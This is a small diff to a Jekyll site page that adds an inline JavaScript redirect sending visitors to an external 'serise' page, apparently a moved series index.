@@ -7,6 +7,9 @@ project-header: true
 header-img: img/about.jpg
 lastmod: 2023-03-04 2:00:00
 ---
+<script type="text/javascript">
+  window.location.href="https://googieyu.com/serise/";
+</script>
 
 <ul class="catalogue">
 {% assign sorted = site.pages | sort: 'order' | reverse %}
